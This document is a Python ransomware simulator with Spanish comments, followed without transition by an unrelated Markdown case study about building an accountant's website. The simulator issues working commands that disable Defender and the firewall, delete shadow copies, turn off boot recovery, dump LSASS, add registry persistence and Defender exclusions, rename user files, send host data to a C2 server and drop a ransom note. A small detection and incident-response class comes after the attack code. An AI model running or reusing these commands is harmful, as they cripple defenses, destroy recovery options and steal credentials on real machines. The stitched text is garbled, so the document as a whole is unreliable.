def is_admin():
    if platform.system() == "Windows":
        try:
            return os.getuid() == 0
        except AttributeError:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.geteuid() == 0

def get_user_profile():
    if platform.system() == "Windows":
        return os.environ.get("USERPROFILE", "C:\\Users")
    return os.path.expanduser("~")

def get_public_path():
    if platform.system() == "Windows":
        return os.environ.get("PUBLIC", "C:\\Users\\Public")
    return "/tmp"

def get_temp_path():
    if platform.system() == "Windows":
        return os.environ.get("TEMP", "C:\\Windows\\Temp")
    return "/tmp"

class RansomwareAnalyzer:
    def __init__(self):
        self.ransomware_name = RANSOMWARE_NAME
        self.extension = EXTENSIONS.get(self.ransomware_name, ".encrypted")
        self.note_file = RANSOM_NOTES.get(self.ransomware_name, "READ_ME.txt")
        self.victim_id = VICTIM_ID
        self.user_profile = get_user_profile()
        self.public_dir = get_public_path()
        self.temp_dir = get_temp_path()
        self.files_encrypted = []
        
    def disable_defenses(self):
        """Desactiva defensas (T1562.001, T1562.004)."""
        print(f"[*] {self.ransomware_name}: Desactivando defensas...")
        
        if platform.system() == "Windows":
            try:
                subprocess.run(["powershell", "-Command", 
                     "Set-MpPreference -DisableRealtimeMonitoring $true"],
                    capture_output=True)
                print("[+] Real-time monitoring desactivado")
            except:
                pass
            
            try:
                subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
                    capture_output=True)
                print("[+] Firewall desactivado")
            except:
                pass
            
            if self.ransomware_name == "Snatch":
                try:
                    subprocess.run(["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                         "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f"],
                        capture_output=True)
                    print("[+] UAC desactivado (Snatch)")
                except:
                    pass
        else:
            try:
                subprocess.run(["sudo", "systemctl", "stop", "ufw"], capture_output=True)
                print("[+] Firewall desactivado (Linux)")
            except:
                pass
    
    def kill_processes(self):
        """Termina procesos de seguridad/backup (T1489)."""
        print(f"[*] {self.ransomware_name}: Terminando procesos críticos...")
        processes_to_kill = [
            "taskmgr.exe", "procexp.exe", "sqlservr.exe", "msaccess.exe",
            "excel.exe", "winword.exe", "powerpnt.exe", "AcronisAgent.exe",
            "ShadowProtectSvc.exe", "wbengine.exe", "vssvc.exe",
            "MSSQL$SQLEXPRESS", "ntrtscan.exe", "wrsa.exe"
        ]
        if platform.system() == "Windows":
            for proc in processes_to_kill:
                try:
                    subprocess.run(["taskkill", "/F", "/IM", proc], capture_output=True)
                except:
                    pass
        else:
            for proc in processes_to_kill:
                try:
                    subprocess.run(["pkill", "-f", proc], capture_output=True)
                except:
                    pass
    
    def delete_shadows(self):
        """Elimina copias de sombra (T1490)."""
        print(f"[*] {self.ransomware_name}: Eliminando copias de sombra (VSS)...")
        if platform.system() == "Windows":
            try:
                subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True)
                print("[+] VSS eliminadas vía vssadmin")
            except:
                pass
            try:
                subprocess.run(["wmic", "shadowcopy", "delete"], capture_output=True)
                print("[+] VSS eliminadas vía wmic")
            except:
                pass
            try:
                ps_cmd = 'Get-WmiObject Win32_Shadowcopy | Remove-WmiObject'
                subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True)
                print("[+] VSS eliminadas vía PowerShell")
            except:
                pass
    
    def disable_recovery(self):
        """Desactiva recuperación del sistema (T1490)."""
        print(f"[*] {self.ransomware_name}: Desactivando recuperación...")
        if platform.system() == "Windows":
            try:
                subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
                    capture_output=True)
                subprocess.run(["bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"],
                    capture_output=True)
                print("[+] Recuperación desactivada")
            except:
                pass
    
    def escalate_privileges(self):
        """Escalada de privilegios (T1068)."""
        print(f"[*] {self.ransomware_name}: Intentando escalar privilegios...")
        if platform.system() == "Windows":
            if self.ransomware_name == "Maze":
                try:
                    subprocess.run(["secedit", "/export", "/cfg", f"{self.temp_dir}\\secpol.cfg"],
                        capture_output=True)
                    print("[+] Maze: Políticas de seguridad exportadas")
                except:
                    pass
    
    def enumerate_network(self):
        """Reconocimiento de red (T1049, T1018)."""
        print(f"[*] {self.ransomware_name}: Enumerando red...")
        commands = [
            ["net", "view", "/all"],
            ["netstat", "-ano"],
            ["arp", "-a"],
            ["ipconfig", "/all"],
            ["whoami", "/priv"]
        ]
        if platform.system() == "Windows":
            for cmd in commands:
                try:
                    subprocess.run(cmd, capture_output=True, timeout=5)
                except:
                    pass
        else:
            try:
                subprocess.run(["ifconfig"], capture_output=True)
                subprocess.run(["arp", "-a"], capture_output=True)
                subprocess.run(["netstat", "-tulpn"], capture_output=True)
            except:
                pass
    
    def create_mutex(self):
        """Crea mutex (Nemty)."""
        print(f"[*] {self.ransomware_name}: Creando mutex...")
        if self.ransomware_name == "Nemty":
            try:
                with open(f"{self.temp_dir}\\nemty_mutex", "w") as f:
                    f.write("hate")
                print("[+] Mutex 'hate' creado (Nemty)")
            except:
                pass
    
    def create_persistent_process(self):
        """Crea persistencia (Netwalker)."""
        print(f"[*] {self.ransomware_name}: Creando persistencia...")
        if platform.system() == "Windows" and self.ransomware_name == "Netwalker":
            try:
                key_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                subprocess.run(["reg", "add", f"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                     "/v", key_name, "/t", "REG_SZ", 
                     "/d", f'"{sys.executable}" "{os.path.abspath(__file__)}"', "/f"],
                    capture_output=True)
                print(f"[+] Persistencia creada con clave: {key_name}")
            except:
                pass
    
    def dump_lsass(self):
        """Vuelca memoria de LSASS (Pysa)."""
        print(f"[*] {self.ransomware_name}: Volcando LSASS...")
        if platform.system() == "Windows" and self.ransomware_name == "Pysa":
            try:
                subprocess.run(["procdump", "-accepteula", "-ma", "lsass.exe", 
                     f"{self.temp_dir}\\lsass_mem.dmp"],
                    capture_output=True)
                print("[+] LSASS volcado (Pysa)")
            except:
                try:
                    ps_cmd = 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID lsass_mem.dmp full'
                    subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True)
                except:
                    pass
    
    def kill_backup_services(self):
        """Mata servicios de backup (Sekhmet)."""
        print(f"[*] {self.ransomware_name}: Matando servicios de backup...")
        if platform.system() == "Windows" and self.ransomware_name == "Sekhmet":
            services = ["VSS", "wbengine", "MSExchangeIS", "SQLSERVERAGENT"]
            for svc in services:
                try:
                    subprocess.run(["net", "stop", svc, "/y"], capture_output=True)
                except:
                    pass
    
    def create_filesystem_exclusions(self):
        """Crea exclusiones en Defender."""
        print(f"[*] {self.ransomware_name}: Creando exclusiones...")
        if platform.system() == "Windows":
            try:
                paths = [self.user_profile, self.public_dir, self.temp_dir]
                for path in paths:
                    subprocess.run(["powershell", "-Command", 
                         f'Add-MpPreference -ExclusionPath "{path}"'],
                        capture_output=True)
                print("[+] Exclusiones creadas")
            except:
                pass
    
    def encrypt_files(self):
        """Cifra archivos de prueba."""
        print(f"[*] {self.ransomware_name}: Cifrando archivos...")
        test_dirs = [
            self.user_profile,
            self.public_dir,
            os.path.join(self.user_profile, "Documents"),
            os.path.join(self.user_profile, "Desktop"),
            os.path.join(self.user_profile, "Downloads")
        ]
        files_found = []
        for dir_path in test_dirs:
            if os.path.exists(dir_path):
                for root, dirs, files in os.walk(dir_path):
                    for file in files:
                        if file.endswith(('.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png')):
                            files_found.append(os.path.join(root, file))
                            if len(files_found) >= 10:
                                break
                if len(files_found) >= 10:
                    break
        for file_path in files_found[:5]:
            try:
                new_path = file_path + self.extension
                os.rename(file_path, new_path)
                self.files_encrypted.append(new_path)
                print(f"[+] Cifrado: {os.path.basename(file_path)}")
            except:
                pass
    
    def exfiltrate_data(self):
        """Exfiltra datos a servidor C2 (T1041)."""
        print(f"[*] {self.ransomware_name}: Exfiltrando datos...")
        fake_data = {
            "victim_id": self.victim_id,
            "ransomware": self.ransomware_name,
            "timestamp": datetime.now().isoformat(),
            "files_encrypted": self.files_encrypted,
            "system_info": {
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "user": os.getlogin() if platform.system() == "Windows" else os.getenv("USER")
            }
        }
        exfil_path = os.path.join(self.public_dir, f"exfiltrated_{self.victim_id}.json")
        with open(exfil_path, 'w') as f:
            json.dump(fake_data, f, indent=2)
        print(f"[+] Datos exfiltrados guardados en: {exfil_path}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((C2_SERVER, C2_PORT))
            s.send(json.dumps(fake_data).encode())
            s.close()
            print(f"[+] Conexión a C2 establecida en {C2_SERVER}:{C2_PORT}")
        except:
            print(f"[!] No se pudo conectar a C2 en {C2_SERVER}:{C2_PORT}")
    
    def create_ransom_note(self):
        """Crea nota de rescate (T1489)."""
        print(f"[*] {self.ransomware_name}: Creando nota de rescate...")
        note_content = f"""
=======================================================
        {self.ransomware_name} RANSOMWARE ATTACK
=======================================================

TODOS TUS ARCHIVOS HAN SIDO CIFRADOS Y ROBADOS.

ID de Víctima: {self.victim_id}
Ransomware: {self.ransomware_name}
Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{"-" * 50}

¿Qué ha pasado?

Además, hemos exfiltrado tus datos confidenciales.

¿Cómo recuperar tus archivos?
1. Contacta a nuestro equipo:
   - Email: {self.ransomware_name.lower()}_support@onionmail.com
   - Tor Chat: http://{self.ransomware_name.lower()}.onion/support

2. Proporciona tu ID de víctima.
3. Sigue las instrucciones para el pago en Bitcoin.

{"-" * 50}

ADVERTENCIAS:
- No intentes descifrar los archivos.
- No contactes a las autoridades.
- Si no pagas en 72 horas, el precio se duplicará.

        """
        note_paths = [
            os.path.join(self.user_profile, "Desktop", self.note_file),
            os.path.join(self.public_dir, self.note_file),
            os.path.join(self.public_dir, "Desktop", self.note_file)
        ]
        for path in note_paths:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(note_content)
                print(f"[+] Nota creada: {path}")
            except:
                pass

class EDRDetection:
    @staticmethod
    def scan_for_indicators():
        print("\n[*] ESCANEANDO INDICADORES DE COMPROMISO (IOCs)...")
        public_dir = get_public_path()
        user_profile = get_user_profile()
        iocs = []
        for note in RANSOM_NOTES.values():
            for root, dirs, files in os.walk(user_profile):
                if note in files:
                    iocs.append(f"Nota de rescate: {os.path.join(root, note)}")
        for ext in EXTENSIONS.values():
            for root, dirs, files in os.walk(user_profile):
                for file in files:
                    if file.endswith(ext):
                        iocs.append(f"Archivo cifrado: {os.path.join(root, file)}")
        exfil_files = list(Path(public_dir).glob("exfiltrated_*.json"))
        for f in exfil_files:
            iocs.append(f"Datos exfiltrados: {f}")
        if iocs:
            print("[!] INDICADORES DETECTADOS:")
            for ioc in iocs:
                print(f"    - {ioc}")
        else:
            print("[+] No se encontraron indicadores.")
        return iocs
    
    @staticmethod
    def check_vss():
        print("\n[*] VERIFICANDO COPIAS DE SOMBRA (VSS)...")
        if platform.system() == "Windows":
            try:
                result = subprocess.run(["vssadmin", "list", "shadows"],
                    capture_output=True, text=True)
                if "No shadow copies" in result.stdout:
                    print("[!] ALERTA: No hay copias de sombra.")
                    return False
                else:
                    print("[+] Copias de sombra encontradas.")
                    return True
            except:
                print("[!] No se pudo verificar VSS.")
                return False
        else:
            print("[+] VSS no aplica.")
            return True
    
    @staticmethod
    def check_defenses():
        print("\n[*] VERIFICANDO ESTADO DE DEFENSAS...")
        if platform.system() == "Windows":
            result = subprocess.run(["netsh", "advfirewall", "show", "allprofiles"],
                capture_output=True, text=True)
            if "State" in result.stdout:
                if "ON" in result.stdout:
                    print("[+] Firewall: ACTIVADO")
                else:
                    print("[!] Firewall: DESACTIVADO")
            try:
                result = subprocess.run(["powershell", "-Command", 
                     "Get-MpPreference | Select-Object DisableRealtimeMonitoring"],
                    capture_output=True, text=True)
                if "True" in result.stdout:
                    print("[!] Defender: DESACTIVADO")
                else:
                    print("[+] Defender: ACTIVADO")
            except:
                pass
    
    @staticmethod
    def incident_response():
        print("\n[*] PLAN DE RESPUESTA A INCIDENTES...")
        print("[+] 1. Aislar la máquina infectada de la red.")
        print("[+] 2. Tomar imagen forense del sistema.")
        print("[+] 3. Recuperar archivos desde copias de seguridad.")
        print("[+] 4. Restaurar configuraciones de seguridad.")
        print("[+] 5. Notificar a las autoridades.")
        print("[+] 6. Cambiar todas las credenciales.")
        print("[+] 7. Aplicar parches y actualizaciones.")

## ❓ Problem
The accountant faced these challenges:
1. Limited reach to potential clients beyond her local area.
2. Difficulty in showcasing her expertise in a way that adds value to prospective clients.
3. Lack of a streamlined and professional way for potential clients to contact her.

---

## 🎯 Goal
1. Create an attractive, professional website to market her accounting services.
2. Build a **contact form** that allows seamless communication with potential clients.
3. Develop a mini blog to share content and establish her as a trusted authority in accounting.

---

## ✨ Solution

### Understanding User Needs
We conducted a brief survey and interviews with 10 small business owners and freelancers (her target audience) to identify their expectations for an accounting services website. Key findings:
- **Trustworthiness:** A clean and professional design is crucial to establishing trust.
- **Easy Navigation:** Users expect to find information about services quickly.
- **Educational Value:** A blog with tips and guidance enhances the site's value.

### Core Features
1. **Services Page:** Clear and concise information about her offerings.
2. **Contact Form:** A dynamic form with validation and spam protection.
3. **Blog Section:** Articles categorized by topics (e.g., tax tips, financial planning).
4. **Responsive Design:** Optimized for desktop and mobile users.

### Design and Development Process
1. **Frontend:** Built using **Next.js** for its fast rendering capabilities.
2. **Styling:** Styled with **Tailwind CSS**, ensuring a clean, modern aesthetic.
3. **Component System:** Developed reusable UI components using **ShadCN**.
4. **Interactivity:** Integrated TypeScript for type safety and robust interactivity.
5. **SEO Optimization:** Implemented metadata and structured content for better search rankings.

---

## 🚌 User Journey
1. **Homepage:** Features a welcoming introduction, her services, and a call-to-action for the blog and contact form.
2. **Services Page:** Detailed descriptions of accounting services like bookkeeping, tax preparation, and financial consulting.
3. **Contact Page:** An interactive form that auto-validates inputs and sends direct inquiries to her email.
4. **Blog Page:** Displays articles sorted by relevance with easy navigation.

---

## 🧪 User Testing
We tested the website prototype with 8 participants and gathered insights:
- **Ease of Navigation:** 7/8 participants found the site easy to navigate.
- **Contact Form:** Users appreciated the validation messages and simplicity of the form.
- **Blog Engagement:** The blog received positive feedback, with users suggesting adding a search bar for articles.

---

## ⚙️ Challenges and Learnings
1. **Dynamic Blog Management:** Managing blog posts dynamically required integrating a CMS for easier updates.
2. **Spam Protection:** Setting up a reliable anti-spam solution for the contact form was critical to avoid irrelevant submissions.
3. **Accessibility:** Ensured the site meets accessibility standards, improving usability for all users.

---

## ✨ Final Thoughts
1. **Design Matters:** A clean and professional design significantly increases trust and engagement.
2. **Content is Key:** The blog not only adds value but also boosts SEO and client retention.
3. **Continuous Improvement:** Adding new features like a client testimonial section or financial calculators could further enhance the site's utility.
